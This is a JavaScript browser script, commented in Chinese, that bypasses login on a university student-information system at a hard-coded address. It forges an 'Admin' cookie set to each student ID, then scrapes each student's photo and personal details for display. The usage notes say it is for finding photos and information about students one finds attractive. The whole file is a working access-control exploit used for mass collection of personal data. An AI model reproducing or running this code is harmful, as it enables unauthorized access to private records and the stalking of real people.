var YY={
	codeArray:[],
	imgArray:[],
	imgIndex:-1,
	getHtml:function(code,cb){
		if(!code||code.length==0)return false;
		code=code.trim();
		document.cookie="Admin="+code+";path=/";
		var xhr=new XMLHttpRequest();
		if(typeof cb != 'function'){
			cb=function(text){
				var result=text.match(/\/ima.+jpg/);
				if(result&&result[0].length>0){
					console.log(code+"："+result[0]);
				}
			}
		}
		xhr.onreadystatechange=function(){
			if(xhr.readyState==4){
				if(xhr.status==200){
					cb(xhr.responseText);
				}else{
					console.log("status："+xhr.status);
					cb(xhr.responseText);
				}
			}
		};
		console.log("fetch："+code);
		xhr.open("get","http://202.192.240.77:905/StuAdminx/manage/stu_center/myinfo.aspx",false);
		xhr.send();
		return true;
	},
	displayImg:function(u,i){
		var elm=document.getElementById("YYPenl");
		elm&&elm.remove();
		var penl=document.createElement("center");
		penl.style.position="absolute";
		penl.style.top="30px";
		penl.style.width="100%";
		penl.id="YYPenl";
		penl.onclick=function(){
			YY.fetch();
			penl.remove();
		}
		var img=document.createElement("img");
		img.src=u;
		img.title=i;
		img.alt=i;
		img.id="YYImg";
		penl.appendChild(img);
		document.firstElementChild.appendChild(penl);
	},
	fetch:function(code){
		if(!code)code=YY.codeArray.shift();
		var isSuccess= YY.getHtml(code,function(text){
			var result=text.match(/\/ima.+(jpg|png|bmp|gif)/);
			if(!result||result[0].length==0){
				console.log("Cannot Fatch "+code+" Img");
				YY.fetch();
				return false;
			}
			var iA=text.replace(/\n/g,"").match(/[^\>\<]+?<\/td/g).join("").replace(/<\/td/g,"").match(/[^ ]+/g);
			var info="";
			for(var i=0,len=iA.length;i<len;i++){
				if(iA[i].length>1){
					info+=iA[i]+'\n';
				}
			}
			YY.imgArray.push({url:result[0],info:info});
			YY.imgIndex=YY.imgArray.length-1;
			YY.displayImg(result[0],info);
		});
		if(!isSuccess){
			if(YY.codeArray.length==0){
				alert("你已看完所有图片");
			}else{
				alert("获取图片出错！");
			}
		}
	},
	importCode:function(cArray){
		if(cArray){
			if(typeof cArray=='function'){
				YY.codeArray=cArray.toString().split('\n').slice(1,-1);
			}else if(cArray instanceof Array){			
				while(cArray[cArray.length-1].length<5){
					cArray.length--;
				}
				YY.codeArray=cArray;
			}else{
				console.log("Only Array and \nfunction(){/*\ncode1\ncode2\n...\n*/}\ncan import");
				return false;
			}
			YY.imgArray=[];
			YY.imgIndex=0;
			return true;
		}else{
			var penl=document.createElement("center");
			penl.style.position="absolute";
			penl.style.top="80px";
			penl.style.width="100%";
			penl.id="YYCodeBox";
			var codeBox=document.createElement("textarea");
			codeBox.style.display="block";
			codeBox.style.width="300px";
			codeBox.style.height="400px";
			codeBox.id="YYCodeText";
			codeBox.placeholder=codeBox.title="一行一个学号\n回车确认\nEsc取消";
			codeBox.addEventListener('keyup', function(e){
				if(e.keyCode==13){
					var t=codeBox.value;
					var a=t.split('\n');
					YY.importCode(a);
					penl.remove();
					YY.nextImg();
				}else if(e.keyCode==27){
					penl.remove();
				}
			},false);
			penl.appendChild(codeBox);
			document.firstElementChild.appendChild(penl);
			setTimeout(codeBox.focus(), 500);
		}
	},
	clear:function(){
		YY.codeArray=[];
		YY.imgArray=[];
		YY.imgIndex=-1;
		var elm=document.getElementById("YYImg");
		elm&&elm.remove();
	},
	pervImg:function(){
		if(YY.imgIndex>0){
			YY.imgIndex--;
			var d=YY.imgArray[YY.imgIndex];
			YY.displayImg(d.url,d.info);
		}else{
			alert("已经到最前！");
		}
	},
	nextImg:function(){
		if(YY.imgIndex<YY.imgArray.length-1){
			YY.imgIndex++;
			var d=YY.imgArray[YY.imgIndex];
			YY.displayImg(d.url,d.info);
		}else{
			YY.fetch();
		}
	},
	initControl:function(){
		var url="http://202.192.240.77:905/StuAdminx/manage/stu_center/myinfo.aspx";
		if(location.href!=url){
			if(confirm("提醒：\nFrameSet框架不支持快捷键！\n是否进入个人信息页？【之后需要重新输入代码】")){
				location.href=url;
			}
		}
		window.addEventListener("keyup", function(e){
			switch(e.keyCode){
				case 37://left,pervImg
					YY.pervImg();
					break;
				case 39://right,nextImg
					YY.nextImg();
					break;
				case 38://up,import
					YY.importCode();
					break;
				case 40://down,clear
					if(confirm("是否清除数据？")){
						YY.clear();
					}
			}
		},false);
	}
}
YY.initControl();
YY.importCode();

//【使用说明】
//查找你喜欢的女生/男生的照片和个人信息

//【快捷键操作】
//方向上：导入学号：一行一个学号
//方向右：下一张
//方向左：上一张
//方向下：清除数据
//鼠标移到图片可以显示个人信息

//【API使用】
//YY.getHtml(code,cb);//获取指定学号的HTML数据
//YY.displayImg(url,info);//插入图片
//YY.fetch(code);//获取指定学号的IMG和INFO并调用displayImg显示，若无code值则从codeArry读取
//YY.importImg(cArry);//导入学号数据，支持数组和多行数据。若无cArry则插入文本框插件
//	导入多行数据API，eg:
//	YY.importImg(function(){/*
//		321300****
//		321300****
//		321300****
//	*/});
//YY.nextImg();//显示下一张图片，会自动调用YY.fetch()
//YY.pervImg();//显示上一张图片
//YY.clear();//清除数据
//YY.initControl();//方向键支持